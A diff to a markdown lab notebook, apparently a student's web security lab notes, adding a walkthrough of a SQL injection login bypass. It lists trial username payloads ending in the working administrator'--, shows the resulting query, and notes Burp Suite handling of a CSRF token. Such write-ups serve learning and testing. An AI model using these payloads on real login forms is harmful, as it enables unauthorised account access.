@@ -120,3 +120,67 @@ By using FoxyProxy + Burp, we are able to track the **URI**:
 ```python
 r = request.get(url + uri + payload)
 ```
+
+> Go to: Python script = sqli-lab-01.py
+
+# Lab 2. SQLi allowing Login Bypass
+
+End goal: perform a SQL injection attack and log in as
+the 'administrator' user.
+
+Username _____________  
+Password _____________
+
+- Payload 1  
+Username = `admin`  
+Password = `admin`  
+"Invalid username or password" (this is good, since the
+application won't give out the usernames)
+
+- Payload 2  
+Username = `'`   
+Password =  
+" Interal Server Error" -> This is a sign that the app
+might be vulnerable to SQL injection.
+
+- Payload 3   
+Username = `admin'--`  
+Password =  
+"Invalid username or password"
+
+- Payload 4   
+Username = `administrator'--`  
+Password =  
+SUCCESSFUL LOGIN.
+
+Possible resulting query:
+
+```sql
+SELECT firstname FROM users 
+WHERE username = 'administrator'--' AND password = ''
+```
+
+Using the Burp Suite, we find out that when trying to login, the URI is:  
+`/login` via POST
+
+CSRF = Cross-Site Request Forgery
+
+CSRF TOKEN > Send to Repeater
+
+`csrf=Rpe55pf2gb943uhbr&username=admin&password=admin`
+
+- Validate whether the application cares whether you remove
+the CSRF token or not. In this case, if you remove it,
+you get a "400" response.
+
+"Missing parameter 'csrf'"
+
+```html
+<section>
+    <form class=login-form method=POST action=/login>
+        <input required type="hidden" name="csrf" value="Rp3ascasc">
+        <!-- ... -->
+</section>
+```
+
+> Go to: Python script = sqli-lab-02.py
